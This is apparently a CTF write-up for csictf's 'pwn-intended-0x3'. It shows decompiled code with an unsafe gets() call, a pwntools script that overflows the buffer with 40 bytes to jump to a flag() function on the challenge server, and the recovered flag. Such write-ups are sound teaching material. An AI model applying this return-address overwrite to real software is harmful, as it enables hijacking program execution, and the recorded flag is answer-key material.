## pwn-intended-0x3
The main idea finding the flag is overwrite the correct hex after padding.

#### Step-1:
After I downloaded `pwn-intended-0x3`, I reversed it with IDA, I got this source code:

**main()** function:
```c
undefined8 main(void)

{
  char local_28 [32];

  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Welcome to csictf! Time to teleport again.");
  gets(local_28);
  return 0;
}
```

**flag()** function:
```c
void flag(void)

{
  puts("Well, that was quick. Here\'s your flag:");
  system("cat flag.txt");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

#### Step-2:
I just had to write the address of the flag function after 32+8 bytes.

So I tried using Debugger to get the address of the flag.

```bash
echo into functions | gdb ./pwn-intended-0x3 | grep flag
```
I got this output: `0x00000000004011ce  flag`

#### Step-3:
I wrote a very common `rev_exploit.py` to pwn into the machine.

```python
import pwn

r = pwn.remote('chall.csivit.com', 30013)

payload = "A"*40 + '\xce\x11@\x00\x00\x00\x00\x00'

r.sendline(payload)
r.interactive()
```

#### Step-4:
When I finally ran this `python3 rev_exploit.py`, I got this output:

```bash
[+] Opening connection to chall.csivit.com on port 30013: Done
[*] Switching to interactive mode
Welcome to csictf! Time to teleport again.
Well, that was quick. Here's your flag:
You've reached your destination, here's a flag!
csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}[*] Got EOF while reading in interactive 
$
[*] Interrupted
```
Voila! I got the flag there.

#### Step-5:
Finally the flag becomes:
`csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}`